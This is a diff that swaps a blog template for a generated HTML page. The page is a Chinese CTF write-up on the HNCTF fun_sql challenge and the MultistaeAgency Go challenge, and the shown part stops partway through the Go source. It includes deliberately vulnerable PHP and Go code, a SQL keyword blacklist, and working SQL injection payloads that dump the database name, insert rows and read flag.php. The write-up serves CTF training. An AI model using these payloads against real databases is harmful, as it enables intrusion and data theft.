@@ -1,37 +1,444 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ilikeoyt.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="[HNCTF 2022 WEEK4]fun_sql123456789101112131415161718192021222324252627282930313233343536373839 &lt;?include &quot;mysql.php&quot;;include &quot;flag.php&quot;;if ( $_GET[&amp;#x27;uname&amp;#x27;] !&#x3D; &amp;#x27;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="5-10日常">
+<meta property="og:url" content="https://ilikeoyt.github.io/2023/05/10/5-10%E6%97%A5%E5%B8%B8/index.html">
+<meta property="og:site_name" content="ycx&#39;s blog">
+<meta property="og:description" content="[HNCTF 2022 WEEK4]fun_sql123456789101112131415161718192021222324252627282930313233343536373839 &lt;?include &quot;mysql.php&quot;;include &quot;flag.php&quot;;if ( $_GET[&amp;#x27;uname&amp;#x27;] !&#x3D; &amp;#x27;&amp;#">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/5.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/6.png">
+<meta property="og:image" content="https://ilikeoyt.github.io/image/7.png">
+<meta property="article:published_time" content="2023-05-10T08:44:04.000Z">
+<meta property="article:modified_time" content="2023-05-10T08:44:50.740Z">
+<meta property="article:author" content="ycxlo">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ilikeoyt.github.io/image/5.png">
+
+<link rel="canonical" href="https://ilikeoyt.github.io/2023/05/10/5-10%E6%97%A5%E5%B8%B8/">
 
 
-{% block content %}
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <title>5-10日常 | ycx's blog</title>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
     </div>
   </div>
 
-{% endblock %}
+  <div class="site-meta">
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ycx's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://ilikeoyt.github.io/2023/05/10/5-10%E6%97%A5%E5%B8%B8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="ycxlo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ycx's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          5-10日常
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2023-05-10 16:44:04 / Modified: 16:44:50" itemprop="dateCreated datePublished" datetime="2023-05-10T16:44:04+08:00">2023-05-10</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="HNCTF-2022-WEEK4-fun-sql"><a href="#HNCTF-2022-WEEK4-fun-sql" class="headerlink" title="[HNCTF 2022 WEEK4]fun_sql"></a>[HNCTF 2022 WEEK4]fun_sql</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( <span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$uname</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|left|extractvalue|floor|reverse|update|between|flag|=|&gt;|&lt;|and|\||right|substr|replace|char|&amp;|\\\$|0x|sleep|\#/i&quot;</span>,<span class="variable">$uname</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM ccctttfff WHERE uname=&#x27;<span class="subst">$uname</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$sql</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$db</span>, <span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_store_result</span>(<span class="variable">$db</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;something wrong&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="variable">$row</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>].<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>] === <span class="variable">$uname</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>先直接猜一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database(),3-- +</span><br></pre></td></tr></table></figure>
+
+<p>可以爆出数据库名，但是想继续利用联合注入是没办法的了</p>
+<p>利用联合注入插入数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,database(),3;insert into ccctttfff values(&#x27;222&#x27;,&#x27;2&#x27;,&#x27;222&#x27;);&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p>这样查询到的数据就是我们插入的数据，所以之后再让uname&#x3D;2即可</p>
+<p>也可以这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/union/**/select/**/1,load_file(concat(&#x27;/var/www/html/fla&#x27;,&#x27;g.php&#x27;)),3--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="湖湘杯-2021-final-MultistaeAgency"><a href="#湖湘杯-2021-final-MultistaeAgency" class="headerlink" title="[湖湘杯 2021 final]MultistaeAgency"></a>[湖湘杯 2021 final]MultistaeAgency</h1><p>一个go语言写的文件上传页面</p>
+<p>先看web&#x2F;main.go</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bytes&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/md5&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/json&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;math/rand&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line">	<span class="string">&quot;path/filepath&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> SecretKey = <span class="string">&quot;&quot;</span><span class="comment">//abc123</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> TokenResult <span class="keyword">struct</span> &#123;</span><br><span class="line">	Success <span class="type">string</span> <span class="string">`json:&quot;success&quot;`</span></span><br><span class="line">	Failed <span class="type">string</span> <span class="string">`json:&quot;failed&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> letterBytes = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">RandStringBytes</span><span class="params">(n <span class="type">int</span>)</span></span> <span class="type">string</span> &#123;</span><br><span class="line">	b := <span class="built_in">make</span>([]<span class="type">byte</span>, n)</span><br><span class="line">	<span class="keyword">for</span> i := <span class="keyword">range</span> b &#123;</span><br><span class="line">		b[i] = letterBytes[rand.Intn(<span class="built_in">len</span>(letterBytes))]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="type">string</span>(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getToken</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	values := r.URL.Query()</span><br><span class="line">	fromHostList := strings.Split(r.RemoteAddr, <span class="string">&quot;:&quot;</span>)</span><br><span class="line">	fromHost := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(fromHostList) == <span class="number">2</span> &#123;</span><br><span class="line">		fromHost = fromHostList[<span class="number">0</span>]</span><br><span class="line">	&#125;</span><br><span class="line">	r.Header.Set(<span class="string">&quot;Fromhost&quot;</span>, fromHost)</span><br><span class="line">	command := exec.Command(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;-H&quot;</span>, <span class="string">&quot;Fromhost: &quot;</span>+fromHost, <span class="string">&quot;127.0.0.1:9091&quot;</span>)<span class="comment">//命令执行点，可能有漏洞</span></span><br><span class="line">	<span class="keyword">for</span> k, _ := <span class="keyword">range</span> values &#123;</span><br><span class="line">		command.Env = <span class="built_in">append</span>(command.Env, fmt.Sprintf(<span class="string">&quot;%s=%s&quot;</span>, k, values.Get(k)))</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"> <span class="comment">//该代码段中的 for 循环遍历了 HTTP 请求的 URL 参数，并将参数中的键值对转换为环境变量。具体来说，对于每一个参数，它会按照 key=value 的格式将其添加到 command.Env 数组中。在这个循环中，k 表示参数的名称，而 _ 表示参数的值，但是在这里并没有用到参数的值，因此使用了下划线 _ 来表示忽略该值。values.Get(k) 表示获取指定参数名称 k 的值，然后将参数名称和值格式化为 key=value 的形式，使用 fmt.Sprintf 函数进行字符串格式化。最后，将格式化后的字符串作为一个元素添加到 command.Env 数组中，以便将其传递给 curl 命令作为环境变量使用。</span></span><br><span class="line">	outinfo := bytes.Buffer&#123;&#125;</span><br><span class="line">	outerr := bytes.Buffer&#123;&#125;</span><br><span class="line">	command.Stdout = &amp;outinfo</span><br><span class="line">	command.Stderr = &amp;outerr</span><br><span class="line">	err := command.Start()</span><br><span class="line">	<span class="comment">//res := &quot;ERROR&quot;</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err.Error())</span><br><span class="line">	&#125;</span><br><span class="line">	res := TokenResult&#123;&#125;</span><br><span class="line">	<span class="keyword">if</span> err = command.Wait(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		res.Failed = outerr.String()</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	res.Success = outinfo.String()</span><br><span class="line"></span><br><span class="line">	msg, _ := json.Marshal(res)</span><br><span class="line">	w.Write(msg)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> ListFileResult <span class="keyword">struct</span> &#123;</span><br><span class="line">	Files []<span class="type">string</span> <span class="string">`json:&quot;files&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看当前 token 下的文件</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">listFile</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	values := r.URL.Query()</span><br><span class="line">	token := values.Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">	fromHostList := strings.Split(r.RemoteAddr, <span class="string">&quot;:&quot;</span>)</span><br><span class="line">	fromHost := <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(fromHostList) == <span class="number">2</span> &#123;</span><br><span class="line">		fromHost = fromHostList[<span class="number">0</span>]</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 验证token</span></span><br><span class="line">	<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &amp;&amp; checkToken(token, fromHost) &#123;</span><br><span class="line">		dir := filepath.Join(<span class="string">&quot;uploads&quot;</span>,token)</span><br><span class="line">		files, err := ioutil.ReadDir(dir)</span><br><span class="line">		<span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">var</span> fs []<span class="type">string</span></span><br><span class="line">			<span class="keyword">for</span> _, f := <span class="keyword">range</span> files &#123;</span><br><span class="line">				fs = <span class="built_in">append</span>(fs, f.Name())</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			msg, _ := json.Marshal(ListFileResult&#123;Files: fs&#125;)</span><br><span class="line">			w.Write(msg)</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> UploadFileResult <span class="keyword">struct</span> &#123;</span><br><span class="line">	Code <span class="type">string</span> <span class="string">`json:&quot;code&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将上传的文件到当前token所对应的目录下面，然后请求server服务的/manage接口</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">uploadFile</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> r.Method == <span class="string">&quot;GET&quot;</span> &#123;</span><br><span class="line">		fmt.Fprintf(w, <span class="string">&quot;get&quot;</span>)</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		values := r.URL.Query()</span><br><span class="line">		token := values.Get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">		fromHostList := strings.Split(r.RemoteAddr, <span class="string">&quot;:&quot;</span>)</span><br><span class="line">		fromHost := <span class="string">&quot;&quot;</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(fromHostList) == <span class="number">2</span> &#123;</span><br><span class="line">			fromHost = fromHostList[<span class="number">0</span>]</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//验证token</span></span><br><span class="line">		<span class="keyword">if</span> token != <span class="string">&quot;&quot;</span> &amp;&amp; checkToken(token, fromHost) &#123;</span><br><span class="line">			dir := filepath.Join(<span class="string">&quot;uploads&quot;</span>,token)</span><br><span class="line">			<span class="keyword">if</span> _, err := os.Stat(dir); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				os.MkdirAll(dir, <span class="number">0766</span>)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			files, err := ioutil.ReadDir(dir)</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(files) &gt; <span class="number">5</span> &#123;</span><br><span class="line">				command := exec.Command(<span class="string">&quot;curl&quot;</span>, <span class="string">&quot;127.0.0.1:9091/manage&quot;</span>)</span><br><span class="line">				command.Start()</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			r.ParseMultipartForm(<span class="number">32</span> &lt;&lt; <span class="number">20</span>)</span><br><span class="line">			file, _, err := r.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				msg, _ := json.Marshal(UploadFileResult&#123;Code: err.Error()&#125;)</span><br><span class="line">				w.Write(msg)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">defer</span> file.Close()</span><br><span class="line">			fileName := RandStringBytes(<span class="number">5</span>)</span><br><span class="line">			f, err := os.OpenFile(filepath.Join(dir, fileName), os.O_WRONLY|os.O_CREATE, <span class="number">0666</span>)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				fmt.Println(err)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">defer</span> f.Close()</span><br><span class="line">			io.Copy(f, file)</span><br><span class="line">			msg, _ := json.Marshal(UploadFileResult&#123;Code: fileName&#125;)</span><br><span class="line">			w.Write(msg)</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			msg, _ := json.Marshal(UploadFileResult&#123;Code: <span class="string">&quot;ERROR TOKEN&quot;</span>&#125;)</span><br><span class="line">			w.Write(msg)</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">checkToken</span><span class="params">(token, ip <span class="type">string</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">	data := []<span class="type">byte</span>(SecretKey + ip)</span><br><span class="line">	has := md5.Sum(data)</span><br><span class="line">	md5str := fmt.Sprintf(<span class="string">&quot;%x&quot;</span>, has)</span><br><span class="line">	<span class="keyword">return</span> md5str == token</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IndexHandler</span> <span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">	http.ServeFile(w, r,<span class="string">&quot;dist/index.html&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	file, err := os.Open(<span class="string">&quot;secret/key&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> file.Close()</span><br><span class="line">	content, err := ioutil.ReadAll(file)</span><br><span class="line">	SecretKey = <span class="type">string</span>(content)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/&quot;</span>, IndexHandler)</span><br><span class="line">	fs := http.FileServer(http.Dir(<span class="string">&quot;dist/static&quot;</span>))</span><br><span class="line">	http.Handle(<span class="string">&quot;/static/&quot;</span>, http.StripPrefix(<span class="string">&quot;/static/&quot;</span>, fs))</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/token&quot;</span>, getToken)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/upload&quot;</span>, uploadFile)</span><br><span class="line">	http.HandleFunc(<span class="string">&quot;/list&quot;</span>, listFile)</span><br><span class="line">	log.Print(<span class="string">&quot;start listen 9090&quot;</span>)</span><br><span class="line">	err = http.ListenAndServe(<span class="string">&quot;:9090&quot;</span>, <span 